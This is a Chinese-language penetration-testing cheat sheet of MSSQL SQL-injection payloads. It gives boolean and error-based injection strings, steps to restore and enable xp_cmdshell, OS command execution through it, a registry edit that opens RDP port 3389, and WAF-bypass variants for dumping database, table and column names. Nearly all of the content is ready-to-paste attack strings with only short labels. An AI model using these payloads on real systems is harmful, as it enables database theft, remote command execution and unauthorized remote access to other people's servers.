# 渗透相关语法

相关漏洞学习资料，利用方法和技巧合集 


目录
-----------------

* [Hacking study](#渗透相关语法)
	 * [mssql注入](#mssql注入)
	 
	 
## mssql注入


布尔注入：
**判断版本号
```
' aNd @@version LIKE '%2015%'--+	
```
**如果存在，返回 true说明后台数据库是MSSQL，否则返回 false
```
' and exists(select * from sysobjects)--+	
```
**判断当前是否为sa
```
' and exists(select is_srvrolemember('sysadmin'))--+	
```
**判断有没有xp_cmdshell扩展
```
' and (select count(*) FROM master. dbo.sysobjects Where xtype ='X' AND name = 'xp_cmdshell')>0--+	
```
**恢复xp_cmdshell
```
';dbcc addextendedproc ("sp_oacreate","odsole70.dll")
';dbcc addextendedproc ("xp_cmdshell","xplog70.dll")
或
';exec sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'--+
```
**开启xp_cmdshell
```
;EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--+
```
**命令执行
```
';exec master..xp_cmdshell 'net user'--+	
' and 1=(select * from openrowset('sqloledb','trusted_connection=yes','set fmtonly off exec master..xp_cmdshell ''net user'''))--+
```
**创建一个包含两个字段t1的cmd_sql 表
```
'; CREATE TABLE cmd_sql (t1 varchar(8000))--+
将执行结果存入t1中
';+insert into cmd_sql(t1) exec master..xp_cmdshell 'net user'--+
```
**开启3389端口
```
';exec master..xp_cmdshell 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f'--+	
```

报错注入：
**查看版本号
```
file_name(@@version)
```
**变换N的值就可以爆出所有数据库的名称
```
' and (convert(int,db_name(N)))>0--+ 
```
**查看当前用户
```
' and (user)>0--+ 	
' and 1=(select CAST(USER as int))--+
```
**获取当前数据库  
```
' and 1=(select db_name())--+
```
**获取数据库该语句是一次性获取全部数据库，且语句只适合>=2005
```
' and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(''))--+
' and 1=(select '|'%2bname%2b'|' from master..sysdatabases FOR XML PATH(''))--+
```
**获取当前数据库中的表（有2个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于mssql2005及以上版本）】
```
' and 1=(select quotename(name) from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))--+
' and 1=(select '|'%2bname%2b'|' from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))--+
' and 1=(select top 1 name from sysobjects where xtype='u' and name <> '第一个数据库表名')--+
```
**一次性爆N条所有字段的数据（只限于mssql2005及以上版本）：
```
' and 1=(select top N * from 指定数据库..指定表名 FOR XML PATH(''))--+
' and 1=(select top 1 * from 指定数据库..指定表名 FOR XML PATH(''))--+
```
**暴表
```
' and 1=convert(int,(select top 1 table_name from information_schema.tables))--+
```
绕waf
**获取版本和数据库名
```
'%1eaNd%1e@@version LIKE '%2015%'--+	
'%1eoR%1e1=(db_name/**/()%1e)%1e--+
```
**获取全部数据库
```
'%1eoR%1e1=(SelEct/*xxxxxxxxxxxx*/%1equotename(name)%1efRom master%0f..sysobjects%1ewHerE%1extype='U' FOR XML PATH(''))%1e--
```
**获取表的所有列
```
'%1eaND%1e1=(SelEct/*xxxxxxxxxxxx*/%1equotename/**/(name)%1efRom 数据库名%0f..syscolumns%1ewHerE%1eid=(selEct/*xxxxxxxxx*/%1eid%1efrom%1e数据库名%0f..sysobjects%1ewHerE%1ename='表名')%1efoR%1eXML%1ePATH/**/(''))%1e-
```
